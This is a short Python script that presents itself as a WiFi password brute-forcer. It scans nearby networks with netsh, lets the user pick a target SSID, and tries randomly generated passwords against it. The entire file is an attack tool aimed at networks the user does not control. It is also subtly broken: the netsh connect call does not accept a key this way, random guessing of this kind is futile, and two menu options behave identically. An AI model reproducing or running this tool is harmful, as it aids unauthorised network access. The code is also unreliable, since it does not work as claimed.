import subprocess
import re
import os
import random
import string
from colorama import init, Fore, Style



# Initialize colorama
init(autoreset=True)                                                                                         

    

def scan_wifi():
    result = subprocess.run(['netsh', 'wlan', 'show', 'network', 'mode=Bssid'], capture_output=True, text=True)
    ssids = re.findall(r'SSID \d+ : (.+)', result.stdout)
    return ssids

def generate_random_password():
    length = random.randint(8, 20)  # Random length between 8 and 20
    characters = string.ascii_letters + string.digits
    password = ''.join(random.choice(characters) for i in range(length))
    return password

def wifi_brute_force(ssid, num_attempts=100):
    print(Fore.CYAN + f"Starting brute force attack on SSID: {ssid}")
    for _ in range(num_attempts):
        password = generate_random_password()
        print(Fore.YELLOW + f"Trying password: {password}")
        result = subprocess.run(['netsh', 'wlan', 'connect', 'name=' + ssid, 'key=' + password], capture_output=True, text=True)
        if "successfully connected" in result.stdout:
            print(Fore.GREEN + f"Password found: {password}")
            return password
    print(Fore.RED + "Password not found in the provided attempts.")
    return None

def main():
    while True:
        print(Fore.CYAN + "Scanning for WiFi networks...")
        ssids = scan_wifi()
        if not ssids:
            print(Fore.RED + "No WiFi networks found.")
            return

        print(Fore.CYAN + "Available WiFi networks:")
        for i, ssid in enumerate(ssids, 1):
            print(Fore.CYAN + f"{i}. {ssid}")

        choice = int(input(Fore.YELLOW + "Select the number of the WiFi network: "))
        if choice < 1 or choice > len(ssids):
            print(Fore.RED + "Invalid choice.")
            continue

        ssid = ssids[choice - 1]
        num_attempts = int(input(Fore.YELLOW + "Enter the number of password attempts: "))
        wifi_brute_force(ssid, num_attempts)

        print(Fore.CYAN + "Do you want to:")
        print(Fore.CYAN + "1. Try again with the same WiFi network")
        print(Fore.CYAN + "2. Try again with another WiFi network")
        print(Fore.CYAN + "3. Exit")
        retry_choice = input(Fore.YELLOW + "Enter your choice (1-3): ")

        if retry_choice == '1':
            continue
        elif retry_choice == '2':
            continue
        elif retry_choice == '3':
            print(Fore.RED + "Exiting...")
            break
        else:
            print(Fore.RED + "Invalid choice. Exiting...")
            break

if __name__ == "__main__":
    main()